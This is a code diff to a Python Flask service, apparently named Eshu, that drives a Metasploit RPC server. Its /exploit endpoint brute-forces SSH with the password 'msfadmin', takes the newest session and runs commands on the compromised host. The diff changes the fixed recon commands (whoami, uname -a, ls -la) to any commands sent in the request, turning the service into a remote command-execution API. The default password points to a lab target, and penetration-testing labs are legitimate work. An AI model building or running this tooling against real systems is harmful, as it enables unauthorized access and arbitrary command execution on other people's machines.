@@ -9,7 +9,6 @@ MSF_SERVER = os.getenv("MSF_HOST", "127.0.0.1")
 MSF_PORT = os.getenv("MSF_PORT", 55553)
 ESHU_PORT = int(os.getenv("ESHU_PORT", 5000))
 
-# Connect to the Metasploit RPC server
 print(f"[-] Attempting to connect to MSF at {MSF_SERVER}:{MSF_PORT}")
 while True:
     try: 
@@ -25,10 +24,18 @@ while True:
 
 print(f"[+] Successfully connected to MSF Server!")
 
+def format_output(output):
+    """Format the output with line breaks for readability."""
+    return "\n".join(output.splitlines())
+
 @app.route('/exploit', methods=['POST'])
 def run_exploit():
     """Run SSH brute force and execute commands in session."""
     data = request.json
+    commands = data.get("commands", [])
+
+    if not commands:
+        return jsonify({"status": "error", "message": "No commands provided"}), 400
 
     try:
         # Set up and execute the auxiliary SSH brute force module
@@ -38,7 +45,6 @@ def run_exploit():
         module['PASSWORD'] = "msfadmin"
         module.execute()
 
-        # Wait for a session to open
         time.sleep(3)  # Wait for session to establish
         sessions = client.sessions.list
         if not sessions:
@@ -48,20 +54,19 @@ def run_exploit():
         session_id = max(sessions.keys())
         session = client.sessions.session(session_id)
 
-        # Execute commands within the session
-        commands = ["whoami", "uname -a", "ls -la"]
+        # Execute each command provided in the request
         output = {}
         for cmd in commands:
-            session.write(cmd)  # Send command
-            time.sleep(1)  # Allow time for command to process
-            response = session.read()  # Read command output
+            session.write(cmd)
+            time.sleep(1)
+            response = format_output(session.read())
             output[cmd] = response
 
         return jsonify({
             "status": "Commands executed",
             "session_id": session_id,
             "output": output
-        })
+        }), 200, {'Content-Type': 'application/json; charset=utf-8'}
 
     except Exception as e:
         print(f"[Error] {e}")
